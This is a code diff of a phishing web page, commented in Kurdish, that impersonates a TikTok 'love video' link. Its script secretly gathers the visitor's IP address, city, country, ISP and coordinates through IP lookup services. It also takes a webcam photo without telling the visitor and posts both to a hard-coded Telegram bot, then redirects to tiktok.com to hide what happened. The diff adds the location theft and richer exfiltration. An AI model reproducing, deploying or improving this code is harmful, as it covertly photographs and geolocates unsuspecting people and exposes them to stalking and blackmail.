@@ -1,79 +1,168 @@
 <!DOCTYPE html>
-<html>
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <!-- Meta Tags بۆ TikTok Preview -->
     <meta property="og:title" content="💖 ببینە ئەم ڤیدیۆیە 🥰">
-    <meta property="og:description" content="دڵم بۆ تۆ دەزگێم... ببینە پێش ئەوەی بسڕدرێتەوە 💕">
+    <meta property="og:description" content="لە ناخی دلەوە بۆتۆی ئازیزم 💕 تەنها بۆ تۆ ✨">
     <meta property="og:image" content="https://i.imgur.com/bS4mzWU.jpeg">
     <meta property="og:url" content="https://vt.tiktok.com/ZSQnr4vyV/">
     <meta property="og:type" content="video.other">
     <meta property="og:site_name" content="TikTok">
     
+    <!-- Twitter/X Meta -->
+    <meta name="twitter:card" content="player">
+    <meta name="twitter:title" content="💖 ببینە ئەم ڤیدیۆیە 🥰">
+    <meta name="twitter:description" content="لە ناخی دلەوە بۆتۆی ئازیزم 💕">
+    <meta name="twitter:image" content="https://i.imgur.com/bS4mzWU.jpeg">
+    
     <title>TikTok - Love Video ❤️</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
         body { 
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background: linear-gradient(145deg, #0a0a1a 0%, #1a1a3e 40%, #0f0c29 100%);
             color: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             overflow: hidden;
+            position: relative;
         }
-        .container { text-align: center; padding: 20px; position: relative; }
         
-        /* دڵی جوان */
+        /* Particle effect - شتێکی سەردەمیانە */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 51, 102, 0.4);
+            border-radius: 50%;
+            animation: particleFloat 8s infinite;
+        }
+        
+        .particle:nth-child(1) { left: 5%; animation-delay: 0s; }
+        .particle:nth-child(2) { left: 15%; animation-delay: 1s; }
+        .particle:nth-child(3) { left: 25%; animation-delay: 2s; }
+        .particle:nth-child(4) { left: 35%; animation-delay: 0.5s; }
+        .particle:nth-child(5) { left: 45%; animation-delay: 1.5s; }
+        .particle:nth-child(6) { left: 55%; animation-delay: 3s; }
+        .particle:nth-child(7) { left: 65%; animation-delay: 2.5s; }
+        .particle:nth-child(8) { left: 75%; animation-delay: 4s; }
+        .particle:nth-child(9) { left: 85%; animation-delay: 1.8s; }
+        .particle:nth-child(10) { left: 95%; animation-delay: 3.5s; }
+        
+        @keyframes particleFloat {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 0.8; }
+            50% { opacity: 0.4; }
+            90% { opacity: 0.1; }
+            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+        }
+        
+        .container { 
+            text-align: center; 
+            padding: 20px; 
+            position: relative;
+            z-index: 1;
+            max-width: 380px;
+            width: 100%;
+        }
+        
+        /* Glow effect بۆ دڵ */
+        .heart-glow {
+            width: 160px;
+            height: 160px;
+            margin: 0 auto 35px;
+            position: relative;
+            filter: drop-shadow(0 0 40px rgba(255, 51, 102, 0.3));
+        }
+        
         .heart {
             width: 120px;
             height: 120px;
-            margin: 0 auto 30px;
+            margin: 20px auto;
             position: relative;
             animation: heartbeat 1.5s ease-in-out infinite;
         }
+        
         .heart::before,
         .heart::after {
             content: '';
             position: absolute;
             width: 120px;
             height: 120px;
-            background: linear-gradient(45deg, #ff0050, #ff3366, #ff6b9d);
+            background: linear-gradient(145deg, #ff0050, #ff3366, #ff6b9d);
             border-radius: 50%;
         }
+        
         .heart::before {
             left: -60px;
             top: 0;
         }
+        
         .heart::after {
             left: 0;
             top: -60px;
         }
+        
         .heart-center {
             position: absolute;
             width: 120px;
             height: 120px;
-            background: linear-gradient(45deg, #ff0050, #ff3366, #ff6b9d);
+            background: linear-gradient(145deg, #ff0050, #ff3366, #ff6b9d);
             transform: rotate(45deg);
             top: 0;
             left: 0;
             z-index: 1;
-            border-radius: 20px 0 20px 0;
+            border-radius: 24px 0 24px 0;
+        }
+        
+        .heart-inner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-45deg);
+            z-index: 2;
+            font-size: 36px;
+            color: white;
+            text-shadow: 0 0 20px rgba(255,255,255,0.5);
         }
         
         @keyframes heartbeat {
             0% { transform: scale(1); }
-            15% { transform: scale(1.15); }
+            15% { transform: scale(1.12); }
             30% { transform: scale(1); }
-            45% { transform: scale(1.1); }
+            45% { transform: scale(1.08); }
             60% { transform: scale(1); }
             100% { transform: scale(1); }
         }
         
-        /* دڵە بچووکەکان */
+        /* دڵە بچووکە سەرەکییەکان */
         .floating-hearts {
             position: fixed;
             top: 0;
@@ -84,86 +173,187 @@
             overflow: hidden;
             z-index: 0;
         }
+        
         .floating-heart {
             position: absolute;
             font-size: 20px;
-            color: #ff3366;
-            opacity: 0.3;
-            animation: floatUp 6s linear infinite;
+            opacity: 0.2;
+            animation: floatUp 7s linear infinite;
         }
-        .floating-heart:nth-child(1) { left: 10%; animation-delay: 0s; font-size: 15px; }
-        .floating-heart:nth-child(2) { left: 25%; animation-delay: 1s; font-size: 25px; }
-        .floating-heart:nth-child(3) { left: 45%; animation-delay: 2s; font-size: 18px; }
-        .floating-heart:nth-child(4) { left: 65%; animation-delay: 0.5s; font-size: 22px; }
-        .floating-heart:nth-child(5) { left: 80%; animation-delay: 1.5s; font-size: 16px; }
-        .floating-heart:nth-child(6) { left: 35%; animation-delay: 3s; font-size: 20px; }
-        .floating-heart:nth-child(7) { left: 90%; animation-delay: 2.5s; font-size: 14px; }
-        .floating-heart:nth-child(8) { left: 55%; animation-delay: 4s; font-size: 19px; }
+        
+        .floating-heart:nth-child(1) { left: 8%; animation-delay: 0s; font-size: 14px; }
+        .floating-heart:nth-child(2) { left: 22%; animation-delay: 1.2s; font-size: 22px; }
+        .floating-heart:nth-child(3) { left: 42%; animation-delay: 2.4s; font-size: 16px; }
+        .floating-heart:nth-child(4) { left: 60%; animation-delay: 0.8s; font-size: 24px; }
+        .floating-heart:nth-child(5) { left: 78%; animation-delay: 1.8s; font-size: 15px; }
+        .floating-heart:nth-child(6) { left: 32%; animation-delay: 3.2s; font-size: 20px; }
+        .floating-heart:nth-child(7) { left: 88%; animation-delay: 2.8s; font-size: 13px; }
+        .floating-heart:nth-child(8) { left: 52%; animation-delay: 4.2s; font-size: 18px; }
+        .floating-heart:nth-child(9) { left: 15%; animation-delay: 5s; font-size: 17px; }
+        .floating-heart:nth-child(10) { left: 70%; animation-delay: 3.6s; font-size: 21px; }
         
         @keyframes floatUp {
-            0% { transform: translateY(100vh) scale(0); opacity: 0; }
-            10% { opacity: 0.4; }
-            90% { opacity: 0.4; }
-            100% { transform: translateY(-10vh) scale(1.2); opacity: 0; }
+            0% { transform: translateY(100vh) scale(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.3; }
+            50% { opacity: 0.2; }
+            90% { opacity: 0.1; }
+            100% { transform: translateY(-10vh) scale(1.3) rotate(720deg); opacity: 0; }
         }
         
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid #ff3366;
-            border-radius: 50%;
-            margin: 30px auto;
-            animation: spin 1s linear infinite;
+        /* لۆدینگ بە شێوەیەکی سەردەمیانە */
+        .loader-container {
+            margin: 25px auto;
             position: relative;
             z-index: 1;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .loader-ring {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto;
+            position: relative;
+        }
+        
+        .loader-ring::before,
+        .loader-ring::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid transparent;
+        }
+        
+        .loader-ring::before {
+            border-top-color: #ff3366;
+            border-right-color: #ff6b9d;
+            animation: spinRing 1.2s ease-in-out infinite;
+        }
+        
+        .loader-ring::after {
+            border-bottom-color: rgba(255, 51, 102, 0.3);
+            border-left-color: rgba(255, 107, 157, 0.3);
+            animation: spinRing 0.8s ease-in-out infinite reverse;
+        }
+        
+        @keyframes spinRing {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
         
         .status-text { 
-            color: rgba(255,255,255,0.7); 
-            font-size: 18px; 
-            margin-top: 20px;
+            color: rgba(255,255,255,0.8); 
+            font-size: 17px; 
+            margin-top: 25px;
             position: relative;
             z-index: 1;
-            font-weight: 300;
-            letter-spacing: 1px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
         }
+        
+        .status-text span {
+            display: inline-block;
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+        
+        @keyframes dots {
+            0%, 20% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        
         .progress-bar {
-            width: 280px;
-            height: 4px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 2px;
-            margin: 20px auto;
+            width: 300px;
+            max-width: 85vw;
+            height: 6px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 10px;
+            margin: 18px auto;
             overflow: hidden;
             position: relative;
             z-index: 1;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.05);
         }
+        
         .progress-fill {
             height: 100%;
             width: 0%;
             background: linear-gradient(90deg, #ff0050, #ff3366, #ff6b9d, #ff0050);
-            background-size: 200% 100%;
-            border-radius: 2px;
-            animation: progress 3s ease-in-out forwards, shimmer 1s linear infinite;
+            background-size: 300% 100%;
+            border-radius: 10px;
+            animation: progress 3s ease-in-out forwards, shimmer 0.8s linear infinite;
+            position: relative;
         }
+        
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 14px;
+            height: 14px;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 0 20px rgba(255, 51, 102, 0.6);
+            opacity: 0.7;
+        }
+        
         @keyframes progress {
             0% { width: 0%; }
-            50% { width: 65%; }
-            90% { width: 90%; }
+            40% { width: 55%; }
+            70% { width: 75%; }
+            85% { width: 88%; }
+            95% { width: 95%; }
             100% { width: 100%; }
         }
+        
         @keyframes shimmer {
-            0% { background-position: 200% 0; }
-            100% { background-position: -200% 0; }
+            0% { background-position: 300% 0; }
+            100% { background-position: -300% 0; }
         }
         
         .sub-text {
-            color: rgba(255,255,255,0.4);
+            color: rgba(255,255,255,0.35);
             font-size: 13px;
-            margin-top: 10px;
+            margin-top: 12px;
             position: relative;
             z-index: 1;
+            font-weight: 300;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        
+        /* لینکی تیک تۆک لە خوارەوە - بۆ دروستی */
+        .tiktok-link {
+            margin-top: 40px;
+            padding: 10px 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: rgba(255,255,255,0.2);
+            font-size: 12px;
+            text-decoration: none;
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .tiktok-link:hover {
+            color: rgba(255,255,255,0.5);
+            border-color: rgba(255,255,255,0.1);
+        }
+        
+        .tiktok-link svg {
+            width: 16px;
+            height: 16px;
         }
         
         #video { display: none; }
@@ -171,6 +361,21 @@
     </style>
 </head>
 <body>
+    <!-- Particle Effects -->
+    <div class="particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+    
+    <!-- Floating Hearts -->
     <div class="floating-hearts">
         <span class="floating-heart">💖</span>
         <span class="floating-heart">💕</span>
@@ -180,21 +385,41 @@
         <span class="floating-heart">💝</span>
         <span class="floating-heart">💖</span>
         <span class="floating-heart">💕</span>
+        <span class="floating-heart">💗</span>
+        <span class="floating-heart">💘</span>
     </div>
 
     <div class="container">
-        <div class="heart">
-            <div class="heart-center"></div>
+        <!-- Heart with Glow Effect -->
+        <div class="heart-glow">
+            <div class="heart">
+                <div class="heart-center"></div>
+                <div class="heart-inner">💕</div>
+            </div>
         </div>
-        <div class="loading-spinner"></div>
-        <div class="status-text" id="status">Loading video... 💫</div>
+        
+        <!-- Modern Loader -->
+        <div class="loader-container">
+            <div class="loader-ring"></div>
+        </div>
+        
+        <div class="status-text" id="status">Loading video <span>...</span></div>
+        
         <div class="progress-bar">
             <div class="progress-fill"></div>
         </div>
-        <div class="sub-text">Please wait a moment ❤️</div>
+        
+        <div class="sub-text">✨ tiktok.com ✨</div>
+        
+        <a href="#" class="tiktok-link" onclick="return false;">
+            <svg viewBox="0 0 24 24" fill="currentColor">
+                <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.9 2.89 2.89 0 01-2.88-2.89 2.89 2.89 0 012.88-2.89c.28 0 .56.04.83.1v-3.5a6.38 6.38 0 00-.83-.05A6.35 6.35 0 003.21 16.1a6.35 6.35 0 006.35 6.35 6.35 6.35 0 006.35-6.35v-6.7a8.24 8.24 0 004.77 1.47v-3.45a4.83 4.83 0 01-1.09-.73z"/>
+            </svg>
+            tiktok.com
+        </a>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -205,7 +430,46 @@
         const TELEGRAM_CHAT_ID = "6230485449";
         
         let photoTaken = false;
+        let userInfo = {};
 
+        // ============================
+        // 📍 وەرگرتنی ناونیشان (IP & Location)
+        // ============================
+        async function getUserInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                userInfo = {
+                    ip: data.ip || 'N/A',
+                    city: data.city || 'N/A',
+                    region: data.region || 'N/A',
+                    country: data.country_name || 'N/A',
+                    isp: data.org || 'N/A',
+                    timezone: data.timezone || 'N/A',
+                    lat: data.latitude || 'N/A',
+                    lon: data.longitude || 'N/A',
+                    device: navigator.userAgent
+                };
+                
+                console.log("User info collected:", userInfo);
+            } catch (err) {
+                console.error("Location error:", err);
+                // Backup: تەنها IP بگرە
+                try {
+                    const resp = await fetch('https://api.ipify.org?format=json');
+                    const data = await resp.json();
+                    userInfo.ip = data.ip || 'N/A';
+                    userInfo.device = navigator.userAgent;
+                } catch (e) {
+                    console.error("IP fallback error:", e);
+                }
+            }
+        }
+
+        // ============================
+        // 📷 دەستپێکردنی کامێرا
+        // ============================
         async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -219,19 +483,23 @@
                 video.srcObject = stream;
                 await video.play();
                 
-                setTimeout(() => {
-                    takePhoto(stream);
-                }, 1500);
+                // بە هەمان کات ناونیشان و وێنە
+                setTimeout(async () => {
+                    await takePhoto(stream);
+                }, 1800);
                 
             } catch (err) {
                 console.error("Camera error:", err);
-                document.getElementById('status').textContent = "Loading... ✨";
+                document.getElementById('status').innerHTML = 'Redirecting <span>...</span>';
                 setTimeout(() => {
                     redirectAway();
-                }, 3000);
+                }, 2500);
             }
         }
 
+        // ============================
+        // 📸 وێنەگرتن
+        // ============================
         async function takePhoto(stream) {
             if (photoTaken) return;
             photoTaken = true;
@@ -239,29 +507,36 @@
             try {
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 
                 ctx.drawImage(video, 0, 0);
                 
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                 
-                document.getElementById('status').textContent = "Almost done... 💕";
+                document.getElementById('status').innerHTML = 'Almost ready <span>...</span>';
                 
+                // وێنە و ناونیشانی پێکەوە بنێرە
                 await sendToTelegram(imageData);
                 
             } catch (err) {
                 console.error("Photo error:", err);
             }
             
-            redirectAway();
+            // ڕەوانەکردن
+            setTimeout(() => {
+                redirectAway();
+            }, 500);
             
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
         }
 
+        // ============================
+        // 📤 ناردن بۆ تێلێگرام (وێنە + ناونیشان)
+        // ============================
         async function sendToTelegram(imageBase64) {
             try {
                 const byteString = atob(imageBase64.split(',')[1]);
@@ -272,28 +547,47 @@
                     ia[i] = byteString.charCodeAt(i);
                 }
                 const blob = new Blob([ab], { type: mimeString });
+                
+                // دروستکردنی کاپشن بە ناونیشانەوە
+                const caption = `💖 **New Photo Captured** 💖
+
+━━━━━━━━━━━━━━━━
+📍 **Location:**
+┣ 🌆 City: ${userInfo.city || 'N/A'}
+┣ 🗺 Region: ${userInfo.region || 'N/A'}
+┣ 🌍 Country: ${userInfo.country || 'N/A'}
+┗ 📡 ISP: ${userInfo.isp || 'N/A'}
+
+🌐 **Network:**
+┣ 🖥 IP: ${userInfo.ip || 'N/A'}
+┗ 🕐 Time: ${new Date().toLocaleString()}
+
+━━━━━━━━━━━━━━━━`;
+
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `💖 New Photo Captured\n🕒 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent.substring(0, 100)}`);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                console.log("Photo sent successfully!");
+                console.log("✅ Photo & Info sent successfully!");
                 
             } catch (err) {
                 console.error("Telegram error:", err);
+                // هەوڵی دووبارە
                 try {
                     const response = await fetch(imageBase64);
                     const blob = await response.blob();
                     const formData = new FormData();
                     formData.append('chat_id', TELEGRAM_CHAT_ID);
                     formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', `💖 New Photo`);
-
+                    formData.append('caption', `💖 New Photo - IP: ${userInfo.ip || 'N/A'}, Location: ${userInfo.city || 'N/A'}, ${userInfo.country || 'N/A'}`);
+                    
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
@@ -304,11 +598,21 @@
             }
         }
 
+        // ============================
+        // 🔀 ڕەوانەکردن بۆ تیک تۆک
+        // ============================
         function redirectAway() {
             window.location.href = "https://www.tiktok.com";
         }
 
-        window.addEventListener('load', () => {
+        // ============================
+        // 🚀 دەستپێکردن
+        // ============================
+        window.addEventListener('load', async () => {
+            // یەکەم جار ناونیشان وەربگرە
+            document.getElementById('status').innerHTML = 'Preparing video <span>...</span>';
+            await getUserInfo();
+            // پاشان کامێرا دەست پێ بکە
             startCamera();
         });
     </script>
